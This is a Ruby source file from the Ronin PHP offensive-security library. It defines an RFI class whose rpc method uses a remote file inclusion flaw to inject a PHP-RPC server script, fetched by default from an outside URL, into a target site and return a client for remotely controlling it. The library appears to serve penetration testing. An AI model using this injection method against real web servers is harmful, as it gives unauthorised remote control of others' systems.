#
# Ronin PHP - A Ruby library for Ronin that provides support for PHP
# related security tasks.
#
# Copyright (c) 2007-2009 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#

require 'ronin/rpc/php/client'

module Ronin
  module PHP
    class RFI
      RPC_SCRIPT = 'http://ronin.rubyforge.org/static/ronin/php/rpc/server.min.php'

      #
      # @return [String]
      #   The URL of the PHP-RPC script.
      #
      # @since 0.1.4
      #
      def RFI.rpc_script
        @@ronin_rfi_rpc_script ||= RPC_SCRIPT
      end

      #
      # Sets the URL to the PHP-RPC script.
      #
      # @param [String] new_url
      #   The new URL to the PHP-RPC script.
      #
      # @return [String]
      #   The new URL to the PHP-RPC script.
      #
      # @since 0.1.4
      #
      def RFI.rpc_script=(new_url)
        @@ronin_rfi_rpc_script = new_url
      end

      #
      # Creates a PHP-RPC Client using the RFI vulnerability to inject
      # the PHP-RPC Server script.
      #
      # @param [Hash] options
      #   Additional options.
      #
      # @option options [String] :script (RFI.rpc_script)
      #   The URL of the PHP-RPC Server script.
      #
      # @return [Client]
      #   The new PHP-RPC Client.
      #
      def rpc(options={})
        server_script = (options[:script] || RFI.rpc_script)

        return RPC::PHP::Client.new(url_for(server_script),options)
      end
    end
  end
end
